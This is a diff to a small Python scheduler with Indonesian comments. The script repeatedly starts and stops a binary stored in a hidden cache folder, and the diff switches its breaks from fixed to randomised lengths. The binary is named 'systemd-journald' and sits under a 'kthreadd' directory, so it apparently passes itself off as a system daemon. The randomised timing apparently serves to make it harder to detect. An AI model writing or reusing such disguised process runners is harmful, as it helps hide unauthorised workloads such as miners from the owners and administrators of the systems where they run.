@@ -2,14 +2,23 @@ import os
 import time
 import sys
 import signal
+import random
 
 # CONFIG
 APP_PATH = os.path.expanduser("~/.cache/kthreadd/systemd-journald")  # Lokasi program
 APP_NAME = "systemd-journald"  # Nama proses buat kill
 RUNTIME = 1500  # 25 menit
-BREAKTIME = 300  # 5 menit
-LONG_BREAK = 600  # 10 menit
-CYCLES = 20  # Jumlah siklus sebelum istirahat panjang
+CYCLES = 20  # Jumlah siklus
+
+BREAK_OPTIONS = [120, 240, 360, 480, 600]  # 2–10 menit (detik)
+break_queue = []
+
+def get_next_break():
+    global break_queue
+    if not break_queue:
+        break_queue = BREAK_OPTIONS[:]
+        random.shuffle(break_queue)
+    return break_queue.pop()
 
 def stop_app():
     """Hentikan proses background."""
@@ -31,11 +40,10 @@ def main():
             start_app()
             time.sleep(RUNTIME)
             stop_app()
-            print(f"⏸️ Istirahat {BREAKTIME // 60} menit...")
-            time.sleep(BREAKTIME)
-        
-        print(f"⏲️ Waktunya istirahat panjang {LONG_BREAK // 60} menit...")
-        time.sleep(LONG_BREAK)
+            
+            break_duration = get_next_break()
+            print(f"⏸️ Istirahat {break_duration // 60} menit...")
+            time.sleep(break_duration)
 
 def sigint_handler(sig, frame):
     """Hentikan service kalau dihentikan manual."""
